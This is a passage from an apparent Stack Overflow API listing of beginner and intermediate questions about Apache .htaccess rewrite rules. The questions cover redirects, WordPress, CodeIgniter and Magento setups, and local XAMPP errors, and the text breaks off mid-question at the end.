{"total":14527,"page":1,"pagesize":100,"questions":[{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":8,"score":1,"question_id":13298065,"title":".htaccess website rediect","body":"<p>I need to make changes to my website but I do not want to make them to my live account until I am sure they are right. My account is with GoDaddy and the only way I can do that, according to them, is to move all my files to another folder and test my changes by going to that folder. Instead of calling Duphil.com from a web browser I use Duphil.com/DuphilWork. The coding in the .htaccess file will not let me stay in this folder. Attached is the coding:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteBase /\n\nErrorDocument 404 /index.php?page=404\nErrorDocument 403 /index.php?page=403\n\nRewriteRule ^$ /index.php\nRewriteRule ^about/$ /index.php?page=about\nRewriteRule ^oilfield/$ /index.php?page=oilfield\nRewriteRule ^pipeline/$ /index.php?page=pipeline\nRewriteRule ^safety/$ /index.php?page=safety\nRewriteRule ^sales/$ /index.php?page=sales\nRewriteRule ^contact/$ /index.php?page=contact\nRewriteRule ^stateLicensures/$ /index.php?page=stateLicensures\nRewriteRule ^keyPersonnel/$ /index.php?page=keyPersonnel\nRewriteRule ^projectListings/$ /index.php?page=projectListings\nRewriteRule ^legal/$ /index.php?page=legal\nRewriteRule ^techDivision/$ /index.php?page=techDivision\n\nRewriteRule ^equipment/$ /index.php?page=equipment\nRewriteRule ^projectImages/$ /index.php?page=projectImages\nRewriteRule ^contact/(.*)/$ /index.php?page=contact&amp;contactName=$1\n</code></pre>\n\n<p>I am new to this coding so any help in accomplishing this task will be greatly appreciated.</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":6,"score":0,"question_id":13297913,"title":"Redirecting pages via .htaccess from .php to Wordpress extension","body":"<p>I recently switched my website over to Wordpress. The link structure on the old site was www.example.com/contact.php but now it is www.example.com/contact/. I want <strong>all incoming</strong> links to be redirected to www.example.com/contact/ (or whatever page it is). Someone recently helped me out with this and the .htaccess code is: </p>\n\n<pre><code>RewriteCond %{THE_REQUEST} ^(GET|HEAD|POST)\\ /(.*)\\.php($|\\ )\nRewriteCond %{REQUEST_URI} !wp-login\nRewriteRule ^ /%2/ [L,R=301\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} ^/(.*?)/?$\nRewriteCond %{DOCUMENT_ROOT}/%1.php -f\nRewriteRule ^ /%1.php [L]\n</code></pre>\n\n<p>It works to a certain extent. First, I have a custom contact form (from the Custom Contact Forms plugin) and it won't submit the form. Second, when I try and update a page it just takes me to the posts page. Is there something else I should be excluding besides wp-login? Thanks in advance!!</p>\n"},{"tags":[".htaccess","url","mod-rewrite","rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":6,"score":1,"question_id":13296761,"title":"Url rewriting with parameters","body":"<p>I’m a noob in url rewriting and i really need help to figure this out :</p>\n\n<p>I have this url : section/news.php?url=section/news/27-how_to_make_rewrite.html I want to access this news with the url parameter and the link would be : section/news/27-how_to_make_rewrite.html</p>\n\n<p>the .htacess file is in the root, i have a folder named section and inside this folder i have the news folder</p>\n\n<p>This doest work for me.</p>\n\n<p>I have :</p>\n\n<pre>\nRewriteEngine on\nRewriteBase   /section/\nRewriteRule news/^([a-zA-Z0-9-+/]+)/$ news/news.php?url=$1\n</pre>\n\n<p>How I can do it ?</p>\n"},{"tags":["html",".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":15,"score":0,"question_id":13297523,"title":"htaccess redirecting in some cases","body":"<p>I got an .htaccess file which redirects any request to index.html:</p>\n\n<p>But i want, that only in case if somebody request to </p>\n\n<pre><code>www.mypage.com/login\n</code></pre>\n\n<p>that he will redirected to a file which is located in</p>\n\n<pre><code>/html/login.html\n</code></pre>\n\n<p>Here my file till now:</p>\n\n<pre><code>RewriteBase /\n\nRewriteCond %{REQUEST_FILENAME} !-f\nOptions +FollowSymlinks\nRewriteEngine on\nRewriteRule ^(.*)$ index.html [NC]\n</code></pre>\n\n<p>How to implement this?\nThx!</p>\n"},{"tags":["wordpress",".htaccess","http-status-code-404"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":7,"score":0,"question_id":13297259,"title":"Return 404 server response for a specific URL via htaccess (Wordpress site)","body":"<p>I have a Wordpress site at example.com with permalinks activated.</p>\n\n<p>I have some spammer doing negative SEO to one of my inner pages at <a href=\"http://www.example.com/my-inner-page\" rel=\"nofollow\">http://www.example.com/my-inner-page</a>. I will change the location of this inner page by changing it's permalink.</p>\n\n<p>However, I want these links to stop harming me, so I want to return a 404 error response.</p>\n\n<p>How do I set up this specific rule in htaccess?</p>\n\n<p>I've tried the following and it doesn't work:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n    RewriteRule my-inner-page [R=404,L,NC]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","rewrite","httpd"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":5,"score":1,"question_id":13296689,"title":".htaccess query rewrite rules","body":"<p>I am trying to make it for when a client loads the website:</p>\n\n<pre><code>http://www.example.com/docs/example\n</code></pre>\n\n<p>To actually load the address:</p>\n\n<pre><code>http://www.example.com/docs.php?doc=example\n</code></pre>\n\n<p>But not have it redirect. I have had mixed success with this, but it seems that there is not clear documentation on how this specific rewrite rule is made. If I actually knew regular expressions, then it would make this a lot easier i understand, but I am seeking some help on how to perform this.</p>\n\n<p>Thanks so much!</p>\n"},{"tags":["wordpress",".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":28,"score":-2,"question_id":13292107,"title":"Using .htaccess to redirect example.com/about.php to example.com/about/","body":"<p>I recently switched over my website to Wordpress. My old files were www.example.com/about.php and now its www.example.com/about/. I need to redirect incoming links from the .php extension to just the / for ALL my pages preferably using .htaccess.</p>\n\n<p>What I have:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule ^(.*)$ $1.php [NC,L]\n</code></pre>\n\n<p>Whats in my .htaccess file:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n\n<p>I guess I don't know where I'd put it in my .htaccess file either.\nThanks!</p>\n"},{"tags":["html","ajax",".htaccess","rewrite","hashtag"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":13276402,"title":"how to redirect links without the hashtag # to the correct page with hashtag","body":"<p>On my site, I am loading content dynamically with Ajax, so the URLs are like www.internet.com/#/contact.php, or www.internet.com/#/home.php.</p>\n\n<p>I have many links/pages on my site, so I want to do that with .htaccess.  </p>\n\n<p>How can I check, if there is <strong>NO</strong> hashtag in the URL and add directly after the domain name, or the hashtag without removing the rest of the URL?</p>\n\n<p>So www.internet.com/home.php should be redirected to www.internet.com/#/home.php, for example.</p>\n"},{"tags":[".htaccess","codeigniter","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":7,"score":0,"question_id":13294640,"title":"Moving codeigniter project to a new hosting provider - .htaccess and index.php","body":"<p>I just moved my functional codeigniter project to a new web hosting provider and am now having challenges removing the index.php from the URL using a standard .htaccess mod-rewrite.  Here is the .htaccess that was working fine:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p>I found <a href=\"http://stackoverflow.com/questions/5479103/moving-codeigniter-project-to-amazon-ec2-htaccess-and-modrewrite-problems\">this</a> discussion but I do not have root access to the apache server to make the suggested configuration change.</p>\n\n<p>Using the provided .htaccess file above,</p>\n\n<ul>\n<li>Works fine:   <a href=\"http://www.mysite.com/index.php/plans\" rel=\"nofollow\">http://www.mysite.com/index.php/plans</a></li>\n<li>Doesn't work:   <a href=\"http://www.mysite.com/plans\" rel=\"nofollow\">http://www.mysite.com/plans</a></li>\n</ul>\n\n<p>Any suggestions are appreciated.</p>\n"},{"tags":["php","apache",".htaccess","magento"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":3365,"score":2,"question_id":4055130,"title":"Url rewriting causes Magento admin to become inaccessible","body":"<p>I have magento in a subdirectory in the root and if I set the secure base url and secure base url link to the correct shared ssl url to enable secure pages I have no problem in the FRONTEND. The pages displays as they should. However when I try to access the admin with the secure link below I cannot gain admittance. </p>\n\n<p>For instance in the frontend: <code>http://mydomain.com/shop</code> becomes <code>http://mydomain.com</code> - which is correct.</p>\n\n<p><code>https://mydomain.sharedssl.com/shop/customer/account/login/</code> becomes \n<code>https://mydomain.sharedssl.com/customer/account/login/</code> - which is correct.</p>\n\n<p>But then I can access admin with neither <code>https://mydomain.com/shop/index.php/admin/</code> nor <code>https://mydomain.com//index.php/admin/</code></p>\n\n<p>In the root directory I have this in my htaccess: </p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_URI} !^/shop(.*)\nRewriteRule (.*) /shop/$1 [L]\n</code></pre>\n\n<p>and in the shop (Magento) I have the following: </p>\n\n<pre><code>############################################\n## uncomment these lines for CGI mode\n## make sure to specify the correct cgi php binary file name\n## it might be /cgi-bin/php-cgi\n\n#    Action php5-cgi /cgi-bin/php5-cgi\n#    AddHandler php5-cgi .php\n\n############################################\n## GoDaddy specific options\n\n#   Options -MultiViews\n\n## you might also need to add this line to php.ini\n##     cgi.fix_pathinfo = 1\n## if it still doesn't work, rename php.ini to php5.ini\n\n############################################\n## this line is specific for 1and1 hosting\n\n    #AddType x-mapp-php5 .php\n    #AddHandler x-mapp-php5 .php\n\n############################################\n## default index file\n\n    DirectoryIndex index.php\n\n&lt;IfModule mod_php5.c&gt;\n\n############################################\n## adjust memory limit\n\n#    php_value memory_limit 64M\n    php_value memory_limit 128M\n    php_value max_execution_time 18000\n\n############################################\n## disable magic quotes for php request vars\n\n    php_flag magic_quotes_gpc off\n\n############################################\n## disable automatic session start\n## before autoload was initialized\n\n    php_flag session.auto_start off\n\n############################################\n## enable resulting html compression\n\n    #php_flag zlib.output_compression on\n\n###########################################\n# disable user agent verification to not break multiple image upload\n\n    php_flag suhosin.session.cryptua off\n\n###########################################\n# turn off compatibility with PHP4 when dealing with objects\n\n    php_flag zend.ze1_compatibility_mode Off\n\n&lt;/IfModule&gt;\n\n&lt;IfModule mod_security.c&gt;\n###########################################\n# disable POST processing to not break multiple image upload\n\n    SecFilterEngine Off\n    SecFilterScanPOST Off\n&lt;/IfModule&gt;\n\n&lt;IfModule mod_deflate.c&gt;\n\n############################################\n## enable apache served files compression\n## http://developer.yahoo.com/performance/rules.html#gzip\n\n    # Insert filter on all content\n    ###SetOutputFilter DEFLATE\n    # Insert filter on selected content types only\n    #AddOutputFilterByType DEFLATE text/html text/plain text/xml text/css text/javascript\n\n    # Netscape 4.x has some problems...\n    #BrowserMatch ^Mozilla/4 gzip-only-text/html\n\n    # Netscape 4.06-4.08 have some more problems\n    #BrowserMatch ^Mozilla/4\\.0[678] no-gzip\n\n    # MSIE masquerades as Netscape, but it is fine\n    #BrowserMatch \\bMSIE !no-gzip !gzip-only-text/html\n\n    # Don't compress images\n    #SetEnvIfNoCase Request_URI \\.(?:gif|jpe?g|png)$ no-gzip dont-vary\n\n    # Make sure proxies don't deliver the wrong content\n    #Header append Vary User-Agent env=!dont-vary\n\n&lt;/IfModule&gt;\n\n&lt;IfModule mod_ssl.c&gt;\n\n############################################\n## make HTTPS env vars available for CGI mode\n\n    #SSLOptions StdEnvVars\n\n&lt;/IfModule&gt;\n\n&lt;IfModule mod_rewrite.c&gt;\n\n############################################\n## enable rewrites\n\n    Options +FollowSymLinks\n    RewriteEngine on\n\n############################################\n## you can put here your magento root folder\n## path relative to web root\n\n    RewriteBase /\n\n\n############################################\n## workaround for HTTP authorization\n## in CGI environment\n\n    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]\n\n############################################\n## always send 404 on missing files in these folders\n\n    RewriteCond %{REQUEST_URI} !^/(media|skin|js)/\n\n############################################\n## never rewrite for existing files, directories and links\n\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %{REQUEST_FILENAME} !-l\n\n############################################\n## rewrite everything else to index.php\n\n    RewriteRule  ^(.*)$ /shop/index.php [L]\n\n\n\n&lt;/IfModule&gt;\n\n\n############################################\n## Prevent character encoding issues from server overrides\n## If you still have problems, use the second line instead\n\n    AddDefaultCharset Off\n    #AddDefaultCharset UTF-8\n\n&lt;IfModule mod_expires.c&gt;\n\n############################################\n## Add default Expires header\n## http://developer.yahoo.com/performance/rules.html#expires\n\n    ExpiresDefault \"access plus 1 year\"\n\n&lt;/IfModule&gt;\n\n############################################\n## By default allow all access\n\n    Order allow,deny\n    Allow from all\n\n############################################\n## If running in cluster environment, uncomment this\n## http://developer.yahoo.com/performance/rules.html#etags\n\n    #FileETag none \n</code></pre>\n\n<p>Could someone lend some assistance to getting this to work in the Magento backend?</p>\n"},{"tags":["php","wordpress",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13294678,"title":"Hiding wp-login.php with .htaccess and custom directory","body":"<p>I found what apepars to be a solid method for hiding the <code>wp-login.php</code> / <code>wp-admin</code> directory from would-be spammers and attackers here:</p>\n\n<p><a href=\"http://www.bestwpthemez.com/wordpress/how-to-hide-your-wp-admin-login-page-2437/\" rel=\"nofollow\">http://www.bestwpthemez.com/wordpress/how-to-hide-your-wp-admin-login-page-2437/</a></p>\n\n<pre><code>RewriteEngine On\nRewriteBase / \n##### ABOVE THIS POINT IS ALREADY INSERTED BY WORD PRESS\n##### Michi's code is BELOW #####\nRewriteCond %{REQUEST_URI} wp-admin/\nRewriteCond %{QUERY_STRING} !YOURSECRETWORDHERE\nRewriteRule .*\\.php [F,L]\nRewriteCond %{QUERY_STRING} !YOURSECRETWORDHERE\nRewriteRule ^ADMINFOLDER/(.*) wp-admin/$1?%{QUERY_STRING}&amp;YOURSECRETWORDHERE [L]\n##### Michi’s code is ABOVE #####\n##### BELOW THIS POINT IS ALREADY INSERTED BY WORD PRESS\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n</code></pre>\n\n<p>The problem is I already have a <code>RewriteEngine</code> condition in my <code>.htaccess</code> file to make <code>/blog/</code> my WordPress index. As such, I am getting a re-direct loop when I try to implement the code above, and the <code>ADMINFOLDER</code> directory shows up as a 404. Something is off in my syntax:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /blog/\n##### Michi's code is BELOW #####\nRewriteCond %{REQUEST_URI} wp-admin/\nRewriteCond %{QUERY_STRING} !YOURSECRETWORDHERE\nRewriteRule .*\\.php [F,L]\nRewriteCond %{QUERY_STRING} !YOURSECRETWORDHERE\nRewriteRule ^ADMINFOLDER/(.*) wp-admin/$1?%{QUERY_STRING}&amp;YOURSECRETWORDHERE [L]\n##### Michi’s code is ABOVE #####\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /blog/index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":14,"score":3,"question_id":13292662,"title":".htacess redirect two domains to a single one, with params","body":"<p>I've got currently two domain names pointing to a same application. One is a french url (A) the other domain an english one (B).</p>\n\n<p>We now want to use a third domain name (C) that will be the main one.</p>\n\n<p>So, I need in my .htaccess redirect</p>\n\n<p><code>A.fr/my/great/url</code> to <code>C.com/my/great/url?locale=fr</code> </p>\n\n<p>and</p>\n\n<p><code>B.com/my/great/url</code> to <code>C.com/my/great/url?locale=en</code></p>\n\n<p>How to do so in a my .htaccess?</p>\n\n<p>Thanks a lot</p>\n"},{"tags":[".htaccess","codeigniter-2","codeigniter-url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13268547,"title":"Remove index.php from code igniter 2.1.3","body":"<p>I've been trying for hours and could not make it work. Searched for answers everywhere, and nothing seems to solve my problem.</p>\n\n<p>I even tried the solutions described here: <a href=\"http://stackoverflow.com/questions/9667226/remove-index-php-in-codeigniter-2-1-0\">Remove index.php in codeigniter 2.1.0</a>. No luck at all.</p>\n\n<p>I have set the config['index_page'] as ''.</p>\n\n<p>My .htaccess is on the root folder (where the sys and app folders are) and is written like this:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule .* index.php/$0 [PT,L] \n</code></pre>\n\n<p>Still, the only way I can access my controller methods is with the goddamn index.php in the url.\nAnd yes, my apache conf has mod rewrite enabled.</p>\n\n<p>ANY HELP would be incredibly nice.</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I´ll add some more info, maybe it's relevant.</p>\n\n<ul>\n<li>I´m using ZendServer.</li>\n<li>I´m working at localhost by now.</li>\n</ul>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13293646,"title":"redirecting url and showing the short url on the adress bar","body":"<p>I've seen a lot of sites doing this but haven't found a guide to explain this.\nI have this .htaccess code</p>\n\n<pre><code>Options +FollowSymLinks  \nRewriteEngine On  \nRewriteRule ^users/(\\d+)*$ ./profile.php?id=$1  \n</code></pre>\n\n<p>It redirects site.com/user/1 to site.com/profile.php?id=1\nbut when it redirects I want the user to see in his adress bar the shortened url (site.com/user/1)</p>\n\n<p>How can I do this?</p>\n"},{"tags":[".htaccess","url-rewriting","rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13293592,"title":"Rewrite rules error","body":"<p>I want to rewrite a simple url, but without generating google errors</p>\n\n<p>This code works :</p>\n\n<pre><code>RewriteEngine on\nRewriteRule  lieu/([0-9]+).* index.php?com=location&amp;lID=$1 [L]\nRewriteRule  evenement/([0-9]+).* index.php?eID=$1 [L]\n</code></pre>\n\n<p>but i want to add R=301 flag for SEO</p>\n\n<p>When i add [R=301,L] :</p>\n\n<pre><code>The requested URL /var/www/mysite/index.php was not found on this server.\n</code></pre>\n\n<p>I know that R=301 flag must be used with http://</p>\n\n<p>but when i try the url is not rewritting</p>\n"},{"tags":[".htaccess","find-and-replace"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13281271,"title":".htaccess 301 redirect remove the end of url","body":"<p>I am not very knowledgeable with htaccess and I have searched for an answer and tried a few possible solutions from similar questions.  But no luck.\nWe have a wordpress site that we moved from <code>http://somesite.com/blog/</code> to just <code>http://somesite.com</code>  I have found the way to redirect it but here is the problem: the old url had the post number on the end so it looked like this:</p>\n\n<p><code>http://somesite.com/blog/blog-title-here/1234/</code></p>\n\n<p>the new link for that blog would be like this: </p>\n\n<p><code>http://somesite.com/blog-title-here/</code></p>\n\n<p>Can someone help me figure out a 301 htaccess redirect?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13282262,"title":"Trying to exclude a URL from htaccess rule","body":"<p>I'm trying to setup a global mobile redirect in my httpd.conf for all of my sites on the server and only have to edit it once, vs. 92 times. All sites mobile will redirect to one locate so that's fine.</p>\n\n<p>However I want to exclude one particular URL from redirecting at all. Here's what I have so far that isn't working and causing a redirect loop:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} ^.*iphone|ipod|blackberry|android|sgh|sonyericsson|psp|mot|htc|lg|nokia|palm|treo|j2me|webos|smartphone|symbian.*$ [NC]\nRewriteCond %{REQUEST_URI} !^http://www.example.com/mobile [NC]\nRewriteRule ^(.*) http://www.example.com/mobile [R=302,L]\n</code></pre>\n\n<p>Can anyone figure out why it's causing a redirect loop on that particular url? It's just a folder on that domain with a .htaccess in it only containing <code>RewriteEngine off</code> and an index.php file with a header() redirect call.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13271071,"title":"How to use .htaccess with sub directories of directories","body":"<p>Say I have the following code:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^/\\.]+)/?$ controller.php?request=$1 [L,QSA]\n</code></pre>\n\n<p>If I go to a folder such as folder/subfolder/, it gives me a 404 error, although the folder exists.</p>\n\n<p>How can I make this work with subdirectories?</p>\n\n<p>Thanks</p>\n"},{"tags":["xml",".htaccess","expressionengine"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":11545470,"title":"How to add a .xml extension to a specific URI using .htaccess","body":"<p>I have a URL at the moment www.mydomain.com/feed/my_feed/ which writes out an xml document to be read by a third party. The XML document is dynamically generated (I'm using ExpressionEngine).</p>\n\n<p>The third party have requested that it must have a .xml extension to be read.</p>\n\n<p>Any ideas how I could set up a .htaccess rule to only use a .xml file extension for this particular uri?</p>\n\n<p>Most tutorials are concerned with removing file extensions adding file extensions to all urls, which doesn't help a .htaccess noob.</p>\n\n<p>Many thanks in advance.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13272682,"title":"Dont apply rule when it starts with a particular word","body":"<p>first rule:</p>\n\n<pre><code>RewriteRule ^([a-z]+)/([^-]+)-([^&amp;]+)$ lala.php?type=$1&amp;id=$2&amp;title=$3 [L]\n</code></pre>\n\n<p>second rule:</p>\n\n<pre><code>RewriteRule ^testpage/([^-]+)-([^&amp;]+)$ lala.php?type=$1&amp;id=$2 [L]\n</code></pre>\n\n<p>The first rule overwrites the second rule. Is there a possibility to say smth like: Apply the first rule when ([a-z]+) is not \"testpage\"?</p>\n"},{"tags":["wordpress","apache",".htaccess","mod-rewrite","cpanel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13274720,"title":"Handle Trailing slashes at the end of URL","body":"<p>There is clear cut advantage of using consistent URL structure for wordpress website. </p>\n\n<p>I want all of my URL's to end with / (the homepage and internal page URL's). Let me give an example website which is handling it very efficiently so that the URL's without ending with slash or ending with multiple slashes are 301 redirected to URL with single slash.</p>\n\n<p><code>http://viralpatel.net/blogs</code>   301 redirect to viralpatel.net/blogs/</p>\n\n<p><code>http://viralpatel.net/blogs//</code> 301 redirect to viralpatel.net/blogs/</p>\n\n<p><code>http://viralpatel.net/blogs/</code>  200 OK</p>\n\n<p><code>http://viralpatel.net/blogs/check-string-is-valid-date-java</code> 301 redirect to <code>http://viralpatel.net/blogs/check-string-is-valid-date-java/</code></p>\n\n<p><code>http://viralpatel.net/blogs/check-string-is-valid-date-java//</code> 301 redirect to <code>http://viralpatel.net/blogs/check-string-is-valid-date-java/</code></p>\n\n<p><code>http://viralpatel.net/blogs/check-string-is-valid-date-java/</code> 200 OK</p>\n\n<p>Any idea what .htaccess rules can help achieve this. My current .htaccess looks like:</p>\n\n<pre><code>    RewriteEngine On\n    RewriteCond %{HTTP_HOST} ^javaexperience.com [NC]\n    RewriteRule ^(.*)$ http://www.javaexperience.com/$1 [R=301,L]\n    RewriteBase /\n    RewriteRule ^index\\.php$ - [L]\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d    \n    RewriteRule . /index.php [L]\n</code></pre>\n"},{"tags":[".htaccess","xampp","virtualhost"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13286781,"title":".htaccess redirect dynamic domain to folder","body":"<p>For local development I've setup my router to redirect all requests to *.lan to my local xampp server. Now I have to setup virtual hosts for every domain I want to use. This works, but I don't want to setup a new virtual host (pointing to the corresponding folder) for every project and restart apache.</p>\n\n<p>Is it possible to create a .htaccess file to \"catch\" a domain, and rewrite it to the folder, so I can use the domain as the folder name? For example:</p>\n\n<p>example1.lan loads the website located in /example1/</p>\n\n<p>example2.lan loads the website located in /example2/</p>\n\n<p>This tread ( <a href=\"http://stackoverflow.com/questions/12532263/apache-domain-for-localhost-to-access-folders-as-http-folder-local\">Apache - Domain for localhost to access folders as http://folder.local</a> ) does almost the same thing, but with a redirect. I don't want a redirect, I want rewrite.</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["php",".htaccess","get"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":33,"score":3,"question_id":13290864,"title":"Very simple RewriteRule doesn't work","body":"<p>I have index.php with only one line in it</p>\n\n<pre><code>&lt;?php echo $_GET['a']; ?&gt;\n</code></pre>\n\n<p>And also I have a .htaccess with only two lines in it</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^([a-z]+)$ ?a=$1\n</code></pre>\n\n<p>Why when I enter <code>/ab.cd</code> I get a 404 error, but if I entering <code>/abcd.</code> it doesn't give me a 404 error and PHP echos <code>abcd</code> (without the dot on the end of the url).</p>\n\n<p>Can anybody tell me why my rewrite rule allows <code>abcd.</code> through instead of giving me a 404 error?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13289609,"title":"Rewrite rule with htaccess, redirect 301","body":"<p>I am trying to execute this rule:</p>\n\n<pre><code>RewriteRule ^featured$ home.php?featurez=1 [L,NC,PT,R=301]\n</code></pre>\n\n<p>But what I get is:</p>\n\n<pre><code>http://apps.com/var/www/vhosts/apps.com/httpdocs/iphone/home.php?featurez=1\n</code></pre>\n\n<p>I tried to overcome it with PT tags...but nothing has an effect on it :(..whats the problem and how do I solve it..</p>\n"},{"tags":[".htaccess","internal-server-error"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":9,"score":-1,"question_id":13291933,"title":".htaccess internal server error 500","body":"<p>I have an .htaccess file. The content is:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n   RewriteEngine on\n   RewriteRule (.*\\.(png|gif|jpg|jpeg|js|css|swf))$ webroot/img_handler.php?arg=$1 [L] \n   RewriteRule    ^$ webroot/    [L]\n   RewriteRule    (.*) webroot/$1 [L]\n&lt;/IfModule&gt;\n# test 5\n\n# disable directory browsing -IMPORTANT, do NOT remove.\nOptions -Indexes\n\n# protect the htaccess file\n&lt;files .htaccess&gt;\norder allow,deny\ndeny from all\n&lt;/files&gt;\n\n# disable the server signature\nServerSignature Off\n\n\n# protect php.ini\n&lt;files *.ini&gt;\norder allow,deny\ndeny from all\n&lt;/files&gt;\n</code></pre>\n\n<p>and this is cause an internal server error, what's the problem?</p>\n\n<p>thx:\npixeles</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":7,"score":0,"question_id":13291241,"title":"Redirect a request to different URL even if file exists","body":"<p>Ok so I need to redirect all requests to javascript files to a compression system I have created.</p>\n\n<p>so admin/js/_global.js would redirect to _lib/compress.php?file=admin/js/_global.js</p>\n\n<p>I have tried the follow htaccess code located in the root of the site but it just doesn't work.</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteRule ^admin/js/(.*)\\.js$ _lib/compress\\.php?f=admin/js/$1\\.js [R=301,L]\n</code></pre>\n\n<p>Anyone have any ideas?</p>\n"},{"tags":[".htaccess","localhost"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13291479,"title":"htaccess rewrite in localhost","body":"<p>I have project in localhost folder is structured</p>\n\n<pre><code>htdocs\n   -main\n   -projects\n     -project1\n     -project2\n</code></pre>\n\n<p>In main directory there are smarty engine and other main php functions that all the projects use. In project fodler there are projects that access the main folder with full path.</p>\n\n<p>I use short urls - <code>localhost/projects/project1/methodthatshouldbeactivated</code>\nbut on localhost the method is not called and it loads only the index page. with default function. on sever everything works fine. </p>\n"},{"tags":["apache",".htaccess","mod-rewrite","xampp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13277986,"title":"\"RewriteEngine not allowed here\" .htaccess error using XAMPP","body":"<p>I am trying to configure Apache to allow .htaccess Rewrite rules. I am using XAMPP to run Apache locally. However, I keep getting 500 errors. I have been Googling for several hours about this and tried all the common solutions, so please read my entire post so as not to duplicate solutions I have already tried. </p>\n\n<p>When I check the apache error log the error reads: </p>\n\n<blockquote>\n  <p>\"C:/xampp/htdocs/xampp/websites/demo2/.htaccess: RewriteEngine not allowed here\". </p>\n</blockquote>\n\n<p>Almost every other person I could find that was having this issue solved it 